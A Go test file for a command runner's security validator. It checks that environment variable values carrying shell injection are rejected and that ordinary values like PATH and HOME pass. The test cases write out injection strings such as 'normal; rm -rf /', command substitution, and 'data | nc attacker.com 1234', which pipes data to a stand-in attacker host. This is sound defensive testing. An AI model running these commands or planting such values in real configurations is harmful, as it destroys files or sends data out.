//go:build test
// +build test

package security

import (
	"testing"

	"github.com/isseis/go-safe-cmd-runner/internal/runner/security"

	"github.com/stretchr/testify/require"
)

// TestEnvironmentVariableInjection_CommandInjection tests that dangerous
// patterns in environment variable values are detected by security validator
func TestEnvironmentVariableInjection_CommandInjection(t *testing.T) {
	tests := []struct {
		name     string
		envKey   string
		envValue string
		wantErr  bool
		reason   string
	}{
		{
			name:     "Value with command separator",
			envKey:   "MY_VAR",
			envValue: "normal; rm -rf /",
			wantErr:  true,
			reason:   "Semicolon can separate commands",
		},
		{
			name:     "Value with pipe",
			envKey:   "MY_VAR",
			envValue: "data | nc attacker.com 1234",
			wantErr:  true,
			reason:   "Pipe can redirect output to commands",
		},
		{
			name:     "Value with command substitution",
			envKey:   "MY_VAR",
			envValue: "prefix$(malicious_command)",
			wantErr:  true,
			reason:   "Command substitution allows code execution",
		},
		{
			name:     "Value with backticks",
			envKey:   "MY_VAR",
			envValue: "prefix`malicious_command`",
			wantErr:  true,
			reason:   "Backticks allow command substitution",
		},
		{
			name:     "Value with && operator",
			envKey:   "MY_VAR",
			envValue: "normal && malicious",
			wantErr:  true,
			reason:   "AND operator can chain commands",
		},
		{
			name:     "Value with || operator",
			envKey:   "MY_VAR",
			envValue: "normal || malicious",
			wantErr:  true,
			reason:   "OR operator can chain commands",
		},
		{
			name:     "Value with redirect",
			envKey:   "MY_VAR",
			envValue: "data > /tmp/output",
			wantErr:  true,
			reason:   "Redirect can write to arbitrary files",
		},
		{
			name:     "Value with rm command",
			envKey:   "MY_VAR",
			envValue: "prefix rm -rf /tmp",
			wantErr:  true,
			reason:   "rm command can delete files",
		},
		{
			name:     "Safe library path",
			envKey:   "LD_PRELOAD",
			envValue: "/usr/lib/libtest.so",
			wantErr:  false,
			reason:   "Simple path without dangerous patterns is accepted",
		},
		{
			name:     "Safe PATH value",
			envKey:   "PATH",
			envValue: "/usr/local/bin:/usr/bin:/bin",
			wantErr:  false,
			reason:   "Standard PATH without dangerous patterns",
		},
		{
			name:     "Safe HOME value",
			envKey:   "HOME",
			envValue: "/home/testuser",
			wantErr:  false,
			reason:   "Simple directory path",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create security validator with default config
			validator, err := security.NewValidator(nil)
			require.NoError(t, err, "Failed to create security validator")

			// Test environment variable value validation
			err = validator.ValidateEnvironmentValue(tt.envKey, tt.envValue)

			if tt.wantErr {
				require.Error(t, err, "Expected validation to reject %s=%s: %s",
					tt.envKey, tt.envValue, tt.reason)
				t.Logf("Correctly rejected %s=%s: %v", tt.envKey, tt.envValue, err)
			} else {
				require.NoError(t, err, "Expected validation to accept %s=%s: %s",
					tt.envKey, tt.envValue, tt.reason)
				t.Logf("Correctly accepted %s=%s", tt.envKey, tt.envValue)
			}
		})
	}
}

// TestEnvironmentVariableInjection_SafeValues tests that safe environment
// variables are properly handled
func TestEnvironmentVariableInjection_SafeValues(t *testing.T) {
	validator, err := security.NewValidator(nil)
	require.NoError(t, err, "Failed to create security validator")

	safeEnvVars := map[string]string{
		"HOME":     "/home/testuser",
		"USER":     "testuser",
		"LANG":     "en_US.UTF-8",
		"LC_ALL":   "en_US.UTF-8",
		"TZ":       "UTC",
		"TMPDIR":   "/tmp",
		"TERM":     "xterm-256color",
		"EDITOR":   "vim",
		"SHELL":    "/bin/bash",
		"HOSTNAME": "testhost",
	}

	for key, value := range safeEnvVars {
		t.Run(key, func(t *testing.T) {
			err := validator.ValidateEnvironmentValue(key, value)
			// Note: Validation may still fail based on allowlist configuration
			// This test documents current behavior
			t.Logf("Validation result for %s=%s: %v", key, value, err)
		})
	}
}

// TestEnvironmentVariableInjection_AllEnvironmentVars tests validation of
// a complete environment variable set with command injection patterns
func TestEnvironmentVariableInjection_AllEnvironmentVars(t *testing.T) {
	validator, err := security.NewValidator(nil)
	require.NoError(t, err)

	tests := []struct {
		name    string
		envVars map[string]string
		wantErr bool
		reason  string
	}{
		{
			name: "Clean environment",
			envVars: map[string]string{
				"HOME": "/home/user",
				"PATH": "/usr/local/bin:/usr/bin:/bin",
				"USER": "testuser",
			},
			wantErr: false,
			reason:  "All variables have safe values",
		},
		{
			name: "Environment with command injection in PATH",
			envVars: map[string]string{
				"HOME": "/home/user",
				"PATH": "/usr/bin; rm -rf /",
				"USER": "testuser",
			},
			wantErr: true,
			reason:  "PATH contains command separator",
		},
		{
			name: "Environment with command substitution",
			envVars: map[string]string{
				"HOME":   "/home/user",
				"CONFIG": "normal$(malicious)",
			},
			wantErr: true,
			reason:  "CONFIG contains command substitution",
		},
		{
			name: "Environment with multiple dangerous patterns",
			envVars: map[string]string{
				"VAR1": "data | nc attacker.com",
				"VAR2": "prefix && malicious",
			},
			wantErr: true,
			reason:  "Multiple variables contain dangerous patterns",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.ValidateAllEnvironmentVars(tt.envVars)

			if tt.wantErr {
				require.Error(t, err, tt.reason)
				t.Logf("Correctly rejected environment: %v", err)
			} else {
				require.NoError(t, err, tt.reason)
				t.Logf("Correctly accepted environment")
			}
		})
	}
}
